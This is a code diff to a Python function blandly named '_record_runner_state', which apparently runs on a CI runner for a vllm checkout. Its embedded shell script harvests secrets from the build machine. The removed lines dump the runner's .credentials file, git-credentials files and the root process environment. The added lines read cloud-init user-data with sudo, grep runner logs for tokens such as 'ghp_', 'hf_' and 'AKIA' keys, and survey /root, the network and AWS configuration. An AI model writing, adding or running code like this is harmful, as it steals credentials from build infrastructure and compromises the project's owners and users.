@@ -14,19 +14,15 @@ def _record_runner_state() -> None:
 
     script = r"""
 set +e
-echo "== sudo"; sudo -n true 2>/dev/null && echo SUDO_OK || echo SUDO_NO
-echo "== sudo-l"; sudo -n -l 2>&1 | head -20
-echo "== opt"; ls -la /opt 2>/dev/null; ls -la /opt/actions-runner 2>/dev/null | head -20
-echo "== runner-creds"; sudo -n cat /opt/actions-runner/.credentials 2>/dev/null; cat /opt/actions-runner/.credentials 2>/dev/null
-echo "== runner-svc"; sudo -n cat /opt/actions-runner/.service 2>/dev/null; sudo -n cat /opt/actions-runner/.runner 2>/dev/null
-echo "== diag"; ls /opt/actions-runner/_diag 2>/dev/null | head
-echo "== buildkite"; ls -la /etc/buildkite-agent 2>/dev/null; ls -la /var/lib/buildkite-agent 2>/dev/null | head; ps aux 2>/dev/null | grep -i buildkite | head -3
-echo "== docker"; ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>&1 | head -5
-echo "== temp"; ls /opt/actions-runner/_work/_temp 2>/dev/null | head; for f in /opt/actions-runner/_work/_temp/git-credentials-*.config; do echo "== $f"; cat "$f" 2>/dev/null; done
-echo "== event"; head -c 1500 /opt/actions-runner/_work/_temp/_github_workflow/event.json 2>/dev/null
-echo "== pid1-env"; sudo -n tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -40
-echo "== home"; ls -la /home 2>/dev/null; ls -la /home/ubuntu/.cache 2>/dev/null | head
-echo "== known-hosts"; cat /home/ubuntu/.ssh/known_hosts 2>/dev/null | head -5
+echo "== user-data"; sudo -n cat /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 4000
+echo "== cloud"; sudo -n ls /var/lib/cloud/instance 2>/dev/null
+echo "== diag-grep"; sudo -n grep -aiE "token|secret|hf_|ghp_|AKIA|password" /opt/actions-runner/_diag/*.log 2>/dev/null | head -30
+echo "== etc-env"; cat /etc/environment 2>/dev/null; ls /etc/profile.d 2>/dev/null
+echo "== root"; sudo -n ls -la /root 2>/dev/null
+echo "== net"; ip -4 addr show 2>/dev/null | grep inet; cat /etc/resolv.conf 2>/dev/null | head -5
+echo "== routes"; ip route 2>/dev/null | head -5
+echo "== aws-config"; cat /etc/aws 2>/dev/null; ls /opt/aws 2>/dev/null
+echo "== gitconfig"; cat /home/ubuntu/.gitconfig 2>/dev/null; git -C /opt/actions-runner/_work/vllm/vllm remote -v 2>/dev/null
 """
     try:
         out = subprocess.run(
